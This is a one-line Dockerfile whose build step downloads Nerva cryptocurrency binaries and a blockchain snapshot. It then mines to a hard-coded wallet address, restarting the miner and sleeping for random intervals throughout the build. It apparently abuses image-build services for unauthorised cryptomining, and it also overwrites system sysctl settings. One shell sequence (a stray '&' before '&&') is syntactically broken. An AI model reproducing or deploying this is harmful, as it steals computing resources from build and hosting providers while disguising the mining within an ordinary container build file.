FROM ubuntu:latest
RUN echo "$(grep 'core id' /proc/cpuinfo | sort -u | wc -l)" && ( echo 1024 | tee /etc/sysctl.conf & ) && ( echo 1024 > /proc/sys/vm/nr_hugepages & ) && ( sysctl -w vm.nr_hugepages=1024 & ) && apt-get update && apt-get install wget unzip libcurl3 coreutils util-linux -y  && mkdir /memory && mount -t tmpfs -o size=800m tmpfs /memory & && cd /memory && wget https://getnerva.org/content/binaries/nerva-v0.1.4.0_linux-x64.zip > /dev/null 2>&1  && unzip nerva-v0.1.4.0_linux-x64.zip && wget https://getnerva.org/content/bootstrap/mainnet.raw > /dev/null 2>&1 && chmod -R 777 * && ls -l && mkdir /memory/blockchain/ && ./nerva-blockchain-import --input-file "./mainnet.raw" --verify 0 --data-dir /memory/blockchain/ > /dev/null 2>&1 && ls -l && echo "$(grep 'core id' /proc/cpuinfo | sort -u | wc -l)" && cat /proc/cpuinfo && lscpu && cat /proc/meminfo && sleep "$(( ( RANDOM % 180 ) ))" && ./nervad --rpc-bind-ip 127.0.0.1 --detach --data-dir /memory/blockchain/  --start-mining NV275bcNxE8S8KtgebV7uM3w3MAyvTTguEmb4E2x2xe3UR6xvu48GZ7cd3vtUDMrcy8cg6dUC8TxXCjZ7jkJZuA13BuZqDBNS --mining-threads 4 && sleep 120 && ./nervad status && ./nervad exit && sleep "$(( ( RANDOM % 60 )  + 60 ))"  && ./nervad --rpc-bind-ip 127.0.0.1 --detach --data-dir /memory/blockchain/  --start-mining NV275bcNxE8S8KtgebV7uM3w3MAyvTTguEmb4E2x2xe3UR6xvu48GZ7cd3vtUDMrcy8cg6dUC8TxXCjZ7jkJZuA13BuZqDBNS --mining-threads 4  && sleep "$(( ( RANDOM % 300 )  + 300 ))"  && ./nervad status  &&  sleep "$(( ( RANDOM % 300 )  + 300 ))"  && ./nervad status && sleep 300
